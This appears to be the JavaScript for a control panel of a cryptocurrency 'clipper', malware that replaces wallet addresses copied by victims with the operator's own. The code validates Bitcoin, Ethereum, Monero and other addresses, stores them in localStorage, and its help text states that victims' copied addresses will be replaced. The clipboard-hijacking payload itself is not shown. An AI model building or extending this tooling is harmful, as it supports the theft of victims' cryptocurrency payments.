const sidebar = document.querySelector('.sidebar');
const togglebtn = document.querySelector('.toggle-btn');
togglebtn.addEventListener('click', () => {
    sidebar.classList.toggle('active');
});
const patterns = {
    btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,41}$/,
    eth: /^0x[a-fA-F0-9]{40}$/,
    ltc: /^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,33}$/,
    trx: /^T[a-zA-Z0-9]{28,33}$/,
    bch: /^((bitcoincash:)?(q|p)[a-z0-9]{41})$/,
    xmr: /^4[0-9AB][1-9A-HJ-NP-Za-km-z]{92,95}$/,
    xrp: /^r[0-9a-zA-Z]{24,34}$/,
    zcash: /^t1[0-9A-z]{32,39}$/,
    doge: /^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32,61}$/,
    sol: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/
};
const inputs = document.querySelectorAll('.input-wrapper input');
const errorBubbles = document.querySelectorAll('.error-bubble');
const saveButton = document.getElementById('saveButton');
const resetButton = document.getElementById('resetButton');
function showError(input, bubble) {
    bubble.classList.add('show');
    input.style.borderColor = '#ff4757';
    setTimeout(() => {
        bubble.classList.remove('show');
        input.style.borderColor = 'rgba(255, 255, 255, 0.1)';
        input.value = '';
    }, 3000);
}
inputs.forEach(input => {
    input.addEventListener('change', () => {
        const val = input.value.trim();
        if (val === '') return;
        const currency = input.id;
        const pattern = patterns[currency];
        const bubble = input.parentElement.querySelector('.error-bubble');
        if (!pattern.test(val)) {
            showError(input, bubble);
        }
    });
    const saved = localStorage.getItem(`crypto_${input.id}`);
    if (saved) input.value = saved;
});
saveButton.addEventListener('click', () => {
    let allValid = true;
    inputs.forEach(input => {
        const val = input.value.trim();
        if (val !== '') {
            const pattern = patterns[input.id];
            if (!pattern.test(val)) {
                allValid = false;
                showError(input, input.parentElement.querySelector('.error-bubble'));
            } else {
                localStorage.setItem(`crypto_${input.id}`, val);
            }
        } else {
            localStorage.removeItem(`crypto_${input.id}`);
        }
    });
    if (allValid) {
        showNotification('Clipper addresses saved successfully!', 'success');
    }
});
resetButton.addEventListener('click', () => {
    inputs.forEach(input => {
        input.value = '';
        localStorage.removeItem(`crypto_${input.id}`);
    });
    showNotification('All addresses have been cleared.', 'info');
});
function showHelpMessage() {
    showNotification('Enter your addresses. Victims copied addresses will be replaced with yours if types match.', 'info');
}
document.getElementById('helpButton').addEventListener('click', showHelpMessage);
